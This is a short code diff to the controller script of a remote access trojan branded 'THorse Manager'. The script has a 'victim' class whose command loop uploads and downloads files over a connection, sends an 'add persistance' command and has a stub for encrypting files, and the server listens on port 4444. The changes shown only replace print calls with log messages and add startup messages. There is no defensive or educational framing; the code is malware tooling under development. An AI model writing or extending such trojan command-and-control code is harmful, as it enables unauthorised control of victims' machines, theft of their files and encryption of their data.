@@ -67,16 +67,17 @@ class victim:
                     Log.warning("Switching to home.")
                     break
                 elif args[0] == 'upload':
-                    print("uploading...")
+                    Log.warning("uploading...")
                     upload_file(args[1],conn)
                 elif args[0] == 'download':
-                    print('downloading..')
+                    Log.warning('downloading..')
                     download_file(args[1],conn)
                 elif cmd == 'add persistance':
                     conn.send(cmd.encode())
                 elif cmd == 'help':
                     client_help()
                 elif args[0] == 'encrypt':
+                    Log.warning("Encrypting the file.")
                     pass
                 else:
                     print(reliable_recv(conn))
@@ -144,6 +145,8 @@ if __name__ == "__main__":
     #     print ("Usage : ")
     #     print ("\tpython master.py [HOST] [PORT]")
     #     exit(1)
+    Log.warning("Starting the server...")
+    Log.info("Importing required modules...")
     Log.success(f"Server started at {socket.gethostbyname(socket.gethostname())}:4444")
     Log.success(pyfiglet.figlet_format('THorse  Manager'))
     obj = victim()
